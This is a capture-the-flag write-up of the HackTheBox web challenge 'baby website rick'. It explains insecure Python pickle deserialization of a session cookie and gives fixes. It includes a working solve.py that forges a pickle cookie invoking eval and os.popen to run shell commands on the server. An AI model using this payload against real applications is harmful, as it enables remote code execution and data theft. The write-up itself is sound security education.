---
title: "baby website rick"
date: 2027-04-24 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, insecure-deserialization, pickle, python, rce]
description: "An Easy Web challenge in pure insecure deserialization: the app stores its session in a base64-encoded Python pickle cookie and pickle.loads() it on every request. Because pickle honors __reduce__, a forged cookie runs arbitrary code — and since the app reflects the deserialized value back on the page, eval('cat flag*') prints the flag straight into the response, no reverse shell needed."
---

## Overview

**baby website rick** is an Easy Web challenge built entirely on one bug: [insecure deserialization](https://cwe.mitre.org/data/definitions/502.html) of a cookie. The Flask app (Werkzeug/1.0.1, Python 2.7) stores its session in a base64-encoded **Python pickle** and calls `pickle.loads()` on it for every request. Because `pickle` will execute whatever an object's `__reduce__` tells it to, a forged cookie equals remote code execution — and because the app reflects the deserialized value back into the page, we read the flag straight out of the HTTP response.

## The technique

The first request hands you a cookie and the version banner gives away the stack:

```
HTTP/1.0 302 FOUND
Set-Cookie: plan_b=KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIK...
Server: Werkzeug/1.0.1 Python/2.7.17
```

Base64-decode the `plan_b` cookie and the pickle opcode stream is plain to read:

```
(dp0
S'serum'
p1
ccopy_reg
_reconstructor
p2
(c__main__
anti_pickle_serum     <-- custom class -> the cookie is unpickled server-side
...
```

It's a pickle of `{'serum': <anti_pickle_serum object>}`. The server `pickle.loads()` this on every request and renders `dict['serum']` on the page.

`pickle.loads()` honors an object's `__reduce__` method: an object can declare "to rebuild me, call function `f` with args `(...)`," and the unpickler dutifully calls `f(*args)`. Point `f` at `eval` and you have arbitrary code execution. base64-wrapping changes nothing — pickle is **never** safe on untrusted input. And since this app reflects the deserialized value back in the HTML, we make that value be the **output** of a shell command — no reverse shell, no out-of-band channel.

## Solution

Hand-craft a protocol-0 pickle for `{'serum': eval('<cmd>')}` where the command reads the flag, send it as the cookie, and grep the flag out of the reflected response.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, base64, requests

target = sys.argv[1] if len(sys.argv) > 1 else "http://HOST:PORT"
cmd = '__import__("os").popen("cat flag*").read()'

pickle_bytes = (
    b"(dp0\n"                            # empty dict -> memo0
    b"S'serum'\np1\n"                    # push key 'serum'
    b"c__builtin__\neval\np2\n"          # push __builtin__.eval (Python 2)
    b"(S'" + cmd.encode() + b"'\np3\n"   # MARK + push cmd string
    b"tp4\n"                             # TUPLE -> (cmd,)
    b"Rp5\n"                             # REDUCE -> eval(cmd)
    b"s."                                # SETITEM into dict + STOP
)

cookie = base64.b64encode(pickle_bytes).decode()
r = requests.get(target + "/", cookies={"plan_b": cookie})
print(re.search(r"HTB\{[^}]*\}", r.text).group(0))
```

Run it:

```bash
python3 solve.py http://HOST:PORT
# HTB{...}
```

The flag prints, lifted straight out of the reflected `<span>`. The flag file lives in the current working directory as `flag_*`, which is why `cat flag*` finds it.

> Python version matters: this target is Python 2, so `eval` lives in `__builtin__`
> (`c__builtin__\neval`). For a Python 3 target use `cbuiltins\neval` instead.

## Why it worked

The cookie was trusted as a serialized object with **no signature, no encryption, and no allow-list of permitted classes**. `pickle.loads` executes `__reduce__`, so a forged cookie executes our code, and the app's habit of reflecting the deserialized value turned a blind RCE into a one-line read.

## Fix / defense

- **Never** `pickle.loads()` untrusted input. Use a data-only format with a strict schema:

```python
import json, jsonschema
obj = json.loads(request.cookies['session'])
jsonschema.validate(obj, SESSION_SCHEMA)
```

- If native serialization is unavoidable, **sign and encrypt** the blob (e.g. an HMAC the client cannot forge) and verify it before deserializing.
- Better still, keep session state server-side and hand the client only an opaque random session id.
